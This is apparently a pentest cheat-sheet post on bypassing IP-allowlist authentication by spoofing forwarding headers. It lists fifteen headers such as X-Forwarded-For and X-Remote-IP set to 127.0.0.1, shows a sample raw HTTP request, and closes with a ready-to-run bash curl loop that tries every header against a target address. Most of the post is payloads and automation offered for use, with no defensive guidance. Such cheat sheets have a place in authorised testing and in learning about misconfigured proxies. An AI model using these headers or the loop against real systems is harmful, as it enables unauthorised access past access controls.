The following headers can potentially be used to bypass authentication on a webserver.

- X-Forwarded: 127.0.0.1
- X-Forwarded-By: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Forwarded-For-Original: 127.0.0.1
- X-Forwarder-For: 127.0.0.1
- X-Forward-For: 127.0.0.1
- Forwarded-For: 127.0.0.1
- Forwarded-For-Ip: 127.0.0.1
- X-Custom-IP-Authorization: 127.0.0.1
- X-Originating-Ip: 127.0.0.1
- X-Remote-IP: 127.0.0.1
- X-Remote-Addr: 127.0.0.1
- X-Trusted-IP: 127.0.0.1
- X-Requested-By: 127.0.0.1
- X-Requested-For: 127.0.0.1

## Example Usage

Scenario: You try to access `/login` and get a custom `401` response that says something like:

`IP not on Whitelist!`

(not a likely response but serves as an example)

You'd then try and send the following request:

```bash
GET /login HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Host: bullsec.xyz
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
X-Forwarded-For: 127.0.0.1
```

> That endpoint doesn't exist on this site this is not a lab.
{: .prompt-warning}

The idea is that the webserver will parse the `X-Forwarded-For` header and assume that the request has been forwarded to it on behalf of `127.0.0.1` / `localhost` and let you access the "Blocked" `/login` endpoint. 

## Automation Block

```bash
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Trusted-IP: 127.0.0.1
X-Requested-By: 127.0.0.1
X-Requested-For: 127.0.0.1
```

> Copy the above into a text file

```bash
TARGET=<target-ip-address>
for x in $(cat headers.txt);do curl -v $TARGET -H "$x" ; done
```

That's your lot.

Enjoy,
